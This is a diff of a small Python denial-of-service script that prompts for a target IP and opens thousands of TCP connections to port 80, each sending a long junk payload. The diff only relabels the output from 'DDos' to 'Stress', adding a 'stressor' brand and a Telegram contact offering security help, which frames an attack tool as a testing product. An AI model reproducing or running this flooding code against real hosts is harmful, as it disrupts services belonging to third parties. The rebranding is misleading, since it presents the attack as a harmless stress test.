@@ -13,7 +13,7 @@ R = "\033[31m"
 
 import socket
 print("")
-ip=input("ENTER YOUR TARGET or YOUR IP : ");print ("DDos in your target is raning",ip)
+ip=input("ENTER YOUR TARGET or YOUR IP : ");print ("Stress in your target is Running",ip)
 for h in range(5000):
   try:
       knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)	
@@ -22,7 +22,7 @@ for h in range(5000):
       data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿eljdbcjdjsbsjsbdjdbhdbdhdelarsolallah"*100
       data=data.encode("utf-8")
       knig.send(data)
-      print('[√√√] DDos in (ip)',YY,ip,'DDOS WITH ELHARAM4 is runing ',CC,'port [80]')
+      print('[√√√] Stress in (ip)',YY,ip,'Stress Using Stressor (Owner : Elharam4) runing ',CC,'port [80]')
 
   except :
-    print(R+"the ip is down with you by Elharam4ddos ",ip)#   print(C+"                     no problem in the ip",YY,ip)
+    print(R+"the ip is down with you by My Stressor ",ip,"You Should Up Of Your Security For More Security Help Contact With ME : https://t.me/technologymakers")#   print(C+"no problem in the ip",YY,ip)
